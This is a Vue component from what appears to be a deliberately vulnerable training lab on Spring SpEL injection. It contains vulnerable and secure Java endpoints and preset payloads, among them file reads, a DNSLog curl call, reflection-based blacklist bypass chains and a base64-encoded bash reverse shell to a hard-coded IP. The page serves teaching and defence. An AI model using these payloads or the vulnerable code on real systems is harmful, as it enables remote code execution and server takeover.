<template>
  <div class="root-div">
    <div class="vuln-info">
      <div class="header-div">SpEL表达式注入漏洞</div>
      <div class="body-div">
        <el-tabs v-model="activeName" @tab-click="handleClick">
          <el-tab-pane label="漏洞描述" name="first">
            <div class="vuln-detail">
              SpEL（Spring Expression Language，Spring表达式语言）是Spring框架提供的强大表达式语言，支持在运行时查询和操作对象图。当应用程序将用户可控的输入直接拼接到SpEL表达式中并执行时，攻击者可以注入恶意表达式，实现任意代码执行。
              <br /><br />
              <span style="color: red;">攻击原理：</span>
              <br />
              1. 应用程序使用SpelExpressionParser解析用户输入
              <br />
              2. 攻击者输入包含T()语法的恶意SpEL表达式
              <br />
              3. 表达式通过T()语法访问Java类
              <br />
              4. 调用Runtime.getRuntime().exec()执行系统命令
              <br />
              5. 成功实现远程代码执行（RCE）
            </div>
          </el-tab-pane>
          <el-tab-pane label="漏洞危害" name="second">
            <div class="vuln-detail">
              SpEL表达式注入是一个高危漏洞，可能造成严重的安全后果：
              <br /><br />
              <span style="color: red;">主要危害：</span>
              <br />
              • 远程代码执行（RCE）：执行任意系统命令，完全控制服务器
              <br />
              • 文件操作：读取、创建、修改、删除服务器文件
              <br />
              • 信息泄露：获取系统属性、环境变量、敏感配置
              <br />
              • 反弹Shell：建立持久化后门
              <br />
              • 内网渗透：以服务器为跳板攻击内网
              <br /><br />
              <span style="color: red;">真实案例：</span>
              <br />
              • CVE-2016-4977: Spring Security OAuth SpEL注入
              <br />
              • CVE-2018-1273: Spring Data Commons SpEL注入
              <br />
              • CVE-2022-22963: Spring Cloud Function SpEL注入
            </div>
          </el-tab-pane>
          <el-tab-pane label="安全编码" name="third">
            <div class="vuln-detail">
              <span style="color: red;">【必须】避免直接使用用户输入</span>
              <br />
              永远不要将用户输入直接拼接到SpEL表达式中。如果必须使用动态表达式，使用白名单验证。
              <br /><br />
              <span style="color: red;">【必须】使用SimpleEvaluationContext</span>
              <br />
              使用SimpleEvaluationContext代替StandardEvaluationContext，限制SpEL的能力。
              <br /><br />
              <span style="color: red;">【必须】严格的输入验证</span>
              <br />
              使用白名单验证用户输入，只允许安全的字符（如：字母、数字、运算符等）。
              <br /><br />
              <span style="color: red;">【建议】使用预定义表达式</span>
              <br />
              设计白名单机制，只允许执行预定义的安全表达式，避免动态拼接用户输入。
            </div>
          </el-tab-pane>
          <el-tab-pane label="参考文章" name="fourth">
            <div class="vuln-detail">
              <a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions" target="_blank" style="text-decoration: underline;">《Spring官方文档 - SpEL》</a>：Spring表达式语言的官方文档。<br />
              <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/" target="_blank" style="text-decoration: underline;">《SpEL注入攻击详解》</a>：深入了解SpEL注入原理和利用技巧。<br />
            </div>
          </el-tab-pane>
        </el-tabs>
      </div>
    </div>
    <div class="code-demo">
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - StandardEvaluationContext
              <el-button type="danger" round size="mini" @click="showVulnDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpEL表达式注入 - 漏洞代码
 * 使用StandardEvaluationContext，允许执行任意代码
 */
@PostMapping("/vuln")
public Result spelVulnerable(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("表达式不能为空");
    }
    
    try {
        // 危险：使用StandardEvaluationContext
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("表达式执行失败: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              安全代码 - SimpleEvaluationContext
              <el-button type="success" round size="mini" @click="showSecDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpEL表达式注入 - 安全代码
 * 使用SimpleEvaluationContext，限制SpEL能力
 */
@PostMapping("/sec")
public Result spelSecure(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("表达式不能为空");
    }
    
    try {
        // 安全：使用SimpleEvaluationContext，限制SpEL能力
        // 不允许访问类型引用（T()）、构造函数、反射等危险功能
        ExpressionParser parser = new SpelExpressionParser();
        SimpleEvaluationContext context = 
            SimpleEvaluationContext.forReadOnlyDataBinding().build();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("表达式执行失败: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
      </el-row>
      <el-row :gutter="20" class="grid-flex">
        <el-col :span="12">
          <div class="grid-content bg-purple">
            <el-row type="flex" justify="space-between" align="middle">
              漏洞代码 - 黑名单过滤（可绕过）
              <el-button type="danger" round size="mini" @click="showFilterDialog">去测试</el-button>
            </el-row>
            <pre v-highlightjs><code class="java">
/**
 * SpEL表达式注入 - 黑名单过滤（可被绕过）
 * 尝试通过黑名单过滤危险字符，但过滤不完善
 */
@PostMapping("/filter")
public Result spelBlacklistFilter(@RequestBody Map&lt;String, String&gt; request) {
    String expression = request.get("expression");
    
    if (expression == null || expression.trim().isEmpty()) {
        return Result.error("表达式不能为空");
    }
    
    // 不完善的黑名单过滤：只过滤了部分危险关键字
    String[] blacklist = {"Runtime", "exec"};
    for (String keyword : blacklist) {
        if (expression.contains(keyword)) {
            return Result.error("表达式包含危险关键字: " + keyword);
        }
    }
    
    try {
        // 危险：即使有黑名单过滤，依然使用StandardEvaluationContext
        ExpressionParser parser = new SpelExpressionParser();
        StandardEvaluationContext context = new StandardEvaluationContext();
        
        Expression exp = parser.parseExpression(expression);
        Object result = exp.getValue(context);
        
        String resultStr = result != null ? result.toString() : "null";
        return Result.success(resultStr);
    } catch (Exception e) {
        return Result.error("表达式执行失败: " + e.getMessage());
    }
}</code></pre>
          </div>
        </el-col>
        <el-col :span="12">

        </el-col>
      </el-row>
    </div>

    <!-- 漏洞测试对话框 -->
    <el-dialog title="SpEL表达式注入漏洞测试" :visible.sync="vulnDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        注意，以下是一些常见的SpEL注入测试payload：<br>
        1. 7*7 - 简单计算测试<br>
        2. T(java.lang.System).getProperty('user.dir') - 获取系统属性<br>
        3. T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn') - DNSLog查询（危险）<br>
        4. T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/hosts')) - 读取文件（危险）<br>
        5. new java.io.File('/tmp/test.txt').createNewFile() - 创建文件（危险）<br>
        6. T(java.lang.Runtime).getRuntime().exec('bash -c {echo,...}|{base64,-d}|{bash,-i}') - 反弹shell（极度危险）
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="选择Payload">
          <el-select v-model="vulnForm.selectedPayload" placeholder="请选择测试Payload" @change="updateVulnExpression">
            <el-option label="简单计算 - 7*7" value="calc"></el-option>
            <el-option label="字符串拼接 - 'Hello ' + 'World'" value="string"></el-option>
            <el-option label="获取系统属性 - user.dir" value="userdir"></el-option>
            <el-option label="获取系统属性 - os.name" value="osname"></el-option>
            <el-option label="获取Java版本" value="javaversion"></el-option>
            <el-option label="【危险】DNSLog查询" value="dnslog"></el-option>
            <el-option label="【危险】读取文件" value="readfile"></el-option>
            <el-option label="【极度危险】反弹Shell" value="reverseshell"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="SpEL表达式">
          <el-input v-model="vulnForm.expression" type="textarea" :rows="3" placeholder="请输入SpEL表达式"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testVulnerable">执行表达式</el-button>
        </el-form-item>
      </el-form>
      <div v-if="vulnForm.result" class="result-display">
        <h4>执行结果：</h4>
        <div :class="['result-box', 'result-' + vulnForm.resultType]">
          {{ vulnForm.result }}
        </div>
      </div>
    </el-dialog>

    <!-- 黑名单过滤测试对话框 -->
    <el-dialog title="SpEL表达式注入黑名单过滤测试（可绕过）" :visible.sync="filterDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        注意，黑名单只过滤了以下关键字：<strong>Runtime、exec</strong><br>这是一个非常不完善的黑名单，可以通过多种方式绕过：<br><br>
        <strong>绕过方式1-3：使用未被过滤的危险类</strong><br>
        - ProcessBuilder：功能与Runtime.exec()类似，但未被过滤<br>
        - System：可获取敏感系统信息<br>
        - File：可进行文件系统操作<br><br>
        <strong>绕过方式4：T()语法 + 反射 + 字符串拼接</strong><br>
        - 使用 T(String).getClass() 获取Class类<br>
        - 使用 forName('java.la'+'ng.Run'+'time') 拆分类名并动态加载<br>
        - 使用 getMethod('getRun'+'time') 拆分方法名并动态获取<br>
        - 使用 getMethod('ex'+'ec') 拆分方法名避开关键字检测<br><br>
        <strong>绕过方式5：完全反射链 + 字符串拼接</strong><br>
        - 从字符串对象 ''.getClass() 开始，完全避开T()语法<br>
        - 同样使用字符串拼接拆分所有关键字<br>
        - 纯粹通过反射API完成攻击，更加隐蔽
      </div>
      <br />
      <el-form class="demo-form-inline">
        <el-form-item label="选择绕过方式">
          <el-select v-model="filterForm.selectedBypass" placeholder="请选择绕过方式" @change="updateFilterExpression">
            <el-option label="【被拦截】直接使用 Runtime.exec() - 测试黑名单" value="blocked"></el-option>
            <el-option label="【绕过1】使用 ProcessBuilder 类 - 未被过滤" value="bypass1"></el-option>
            <el-option label="【绕过2】使用 System 类 - 获取系统信息" value="bypass2"></el-option>
            <el-option label="【绕过3】创建文件 - new File().createNewFile()" value="bypass3"></el-option>
            <el-option label="【绕过4】T()语法+反射 - 使用T(String)获取Class" value="bypass4"></el-option>
            <el-option label="【绕过5】完全反射 - 从字符串对象开始反射" value="bypass5"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="SpEL表达式">
          <el-input v-model="filterForm.expression" type="textarea" :rows="4" placeholder="请输入SpEL表达式"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testFilter">执行表达式</el-button>
        </el-form-item>
      </el-form>
      <div v-if="filterForm.result" class="result-display">
        <h4>执行结果：</h4>
        <div :class="['result-box', 'result-' + filterForm.resultType]">
          {{ filterForm.result }}
        </div>
      </div>
    </el-dialog>

    <!-- 安全代码测试对话框 -->
    <el-dialog title="SpEL表达式注入安全防护测试" :visible.sync="secDialogVisible" class="center-dialog">
      <div style="text-align: left; color: red; font-style: italic;">
        注意，以下是一些会被安全防护拦截的payload：<br>
        1. T(java.lang.System).getProperty('user.dir') - 访问Java类（被拦截）<br>
        2. T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn') - DNSLog查询（被拦截）<br>
        3. new java.io.File('/tmp/test.txt') - 创建对象（被拦截）<br>
        <br>
        以下是允许的安全表达式：<br>
        1. 10 + 20 * 3 - 数学运算（允许）<br>
        2. 100 - 50 - 减法运算（允许）<br>
        3. 3.14 * 2 - 小数运算（允许）
      </div>
      <el-form class="demo-form-inline">
        <el-form-item label="测试场景">
          <el-radio-group v-model="secForm.testType" @change="handleTestTypeChange">
            <el-radio label="safe">安全表达式</el-radio>
            <el-radio label="malicious">恶意表达式</el-radio>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="选择表达式">
          <el-select v-model="secForm.selectedExpression" placeholder="请选择表达式" @change="updateSecExpression">
            <template v-if="secForm.testType === 'safe'">
              <el-option label="数学运算: 10 + 20 * 3" value="math1"></el-option>
              <el-option label="减法运算: 100 - 50" value="math2"></el-option>
              <el-option label="小数运算: 3.14 * 2" value="math3"></el-option>
            </template>
            <template v-else>
              <el-option label="访问Java类" value="malicious1"></el-option>
              <el-option label="DNSLog查询" value="malicious2"></el-option>
              <el-option label="创建对象" value="malicious3"></el-option>
            </template>
          </el-select>
        </el-form-item>
        <el-form-item label="SpEL表达式">
          <el-input v-model="secForm.expression" type="textarea" :rows="3" readonly></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="testSecure">测试表达式</el-button>
        </el-form-item>
      </el-form>
      <div v-if="secForm.result" class="result-display">
        <h4>执行结果：</h4>
        <div :class="['result-box', 'result-' + secForm.resultType]">
          {{ secForm.result }}
        </div>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { spelVulnerable, spelFilter, spelSecure } from '@/api/spel';

export default {
  data() {
    return {
      activeName: 'first',
      vulnDialogVisible: false,
      filterDialogVisible: false,
      secDialogVisible: false,
      vulnForm: {
        selectedPayload: '',
        expression: '',
        result: '',
        resultType: 'success'
      },
      filterForm: {
        selectedBypass: '',
        expression: '',
        result: '',
        resultType: 'success'
      },
      secForm: {
        testType: 'safe',
        selectedExpression: '',
        expression: '',
        result: '',
        resultType: 'success'
      }
    };
  },
  methods: {
    handleClick(tab, event) {
      // console.log(tab, event);
    },
    showVulnDialog() {
      this.vulnDialogVisible = true;
      this.vulnForm.selectedPayload = '';
      this.vulnForm.expression = '';
      this.vulnForm.result = '';
    },
    showFilterDialog() {
      this.filterDialogVisible = true;
      this.filterForm.selectedBypass = '';
      this.filterForm.expression = '';
      this.filterForm.result = '';
    },
    showSecDialog() {
      this.secDialogVisible = true;
      this.secForm.testType = 'safe';
      this.secForm.selectedExpression = '';
      this.secForm.expression = '';
      this.secForm.result = '';
    },
    updateVulnExpression() {
      const payloads = {
        'calc': '7*7',
        'string': "'Hello ' + 'World'",
        'userdir': "T(java.lang.System).getProperty('user.dir')",
        'osname': "T(java.lang.System).getProperty('os.name')",
        'javaversion': "T(java.lang.System).getProperty('java.version')",
        'dnslog': "T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn')",
        'readfile': "T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/hosts'))",
        'reverseshell': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42Mi4xMTYuMTY5LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}')"
      };
      this.vulnForm.expression = payloads[this.vulnForm.selectedPayload] || '';
    },
    updateFilterExpression() {
      const bypassPayloads = {
        'blocked': "T(java.lang.Runtime).getRuntime().exec('whoami')",
        'bypass1': "new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'}).start()",
        'bypass2': "T(java.lang.System).getProperty('user.name')",
        'bypass3': "new java.io.File('/tmp/spel_test.txt').createNewFile()",
        'bypass4': "T(String).getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(String)).invoke(T(String).getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null),'whoami')",
        'bypass5': "''.getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(String)).invoke(''.getClass().forName('java.la'+'ng.Run'+'time').getMethod('getRun'+'time').invoke(null),'whoami')"
      };
      this.filterForm.expression = bypassPayloads[this.filterForm.selectedBypass] || '';
    },
    handleTestTypeChange() {
      // 切换测试场景时，清空选择的表达式和表达式内容
      this.secForm.selectedExpression = '';
      this.secForm.expression = '';
      this.secForm.result = '';
    },
    updateSecExpression() {
      const expressions = {
        'math1': '10 + 20 * 3',
        'math2': '100 - 50',
        'math3': '3.14 * 2',
        'malicious1': "T(java.lang.System).getProperty('user.dir')",
        'malicious2': "T(java.lang.Runtime).getRuntime().exec('curl dnslog.cn')",
        'malicious3': "new java.io.File('/tmp/test.txt')"
      };
      this.secForm.expression = expressions[this.secForm.selectedExpression] || '';
    },
    testVulnerable() {
      if (!this.vulnForm.expression) {
        this.$message.warning('请输入SpEL表达式');
        return;
      }
      
      spelVulnerable({ expression: this.vulnForm.expression })
        .then(response => {
          this.vulnForm.result = '✅ 表达式执行成功，结果: ' + response.data;
          this.vulnForm.resultType = 'warning';
        })
        .catch(error => {
          this.vulnForm.result = '❌ 表达式执行失败: ' + (error.msg || error.message || '未知错误');
          this.vulnForm.resultType = 'error';
        });
    },
    testFilter() {
      if (!this.filterForm.expression) {
        this.$message.warning('请输入SpEL表达式');
        return;
      }
      
      spelFilter({ expression: this.filterForm.expression })
        .then(response => {
          this.filterForm.result = '✅ 绕过成功！表达式执行结果: ' + response.data;
          this.filterForm.resultType = 'warning';
        })
        .catch(error => {
          // 被黑名单拦截
          if (error.msg && error.msg.includes('危险关键字')) {
            this.filterForm.result = '🛡️ 被黑名单拦截: ' + error.msg;
            this.filterForm.resultType = 'error';
          } else {
            this.filterForm.result = '❌ 表达式执行失败: ' + (error.msg || error.message || '未知错误');
            this.filterForm.resultType = 'error';
          }
        });
    },
    testSecure() {
      if (!this.secForm.expression) {
        this.$message.warning('请选择表达式');
        return;
      }
      
      spelSecure({ expression: this.secForm.expression })
        .then(response => {
          this.secForm.result = '✅ 表达式执行成功，结果: ' + response.data;
          this.secForm.resultType = 'success';
        })
        .catch(error => {
          this.secForm.result = '❌ 安全机制生效，' + (error.msg || '表达式被拦截');
          this.secForm.resultType = 'success';
        });
    }
  }
};
</script>

<style scoped>
.root-div {
  height: 100%;
}

.vuln-info {
  border-radius: 10px;
  margin-left: 20px;
  margin-right: 20px;
  margin-bottom: 20px;
  margin-top: 10px;
}

.header-div {
  font-size: 24px;
  color: #409EFF;
  font-weight: bold;
  padding: 10px;
  justify-content: center;
  align-items: center;
  border-bottom: 1px solid #ccc;
}

.body-div {
  padding: 10px;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
  font-size: 14px;
}

.vuln-detail {
  background-color: #dce9f8;
  padding: 10px;
}

.code-demo {
  margin: 20px;
  border-top: 1px solid #ccc;
  padding-top: 20px;
}

pre code {
  font-size: 12px;
}

.el-row {
  margin-bottom: 20px;
}

.el-row:last-child {
  margin-bottom: 0;
}

.el-col {
  border-radius: 4px;
}

.bg-purple {
  background: #d3dce6;
}

.grid-content {
  border-radius: 4px;
  height: 100%;
  padding: 10px;
}

.grid-flex {
  display: flex;
  align-items: stretch;
}

.center-dialog {
  text-align: center;
  margin: 0 auto;
}

.demo-form-inline {
  text-align: left;
}

.result-display {
  margin-top: 20px;
  text-align: left;
}

.result-display h4 {
  margin-top: 0;
  margin-bottom: 10px;
  color: #303133;
  font-size: 16px;
  font-weight: bold;
}

.result-box {
  padding: 12px 16px;
  border-radius: 4px;
  line-height: 1.5;
  font-size: 14px;
}

.result-warning {
  background-color: #fdf6ec;
  color: #e6a23c;
  border: 1px solid #f5dab1;
}

.result-success {
  background-color: #f0f9ff;
  color: #67c23a;
  border: 1px solid #c6e2ff;
}

.result-error {
  background-color: #fef0f0;
  color: #f56c6c;
  border: 1px solid #fbc4c4;
}
</style>
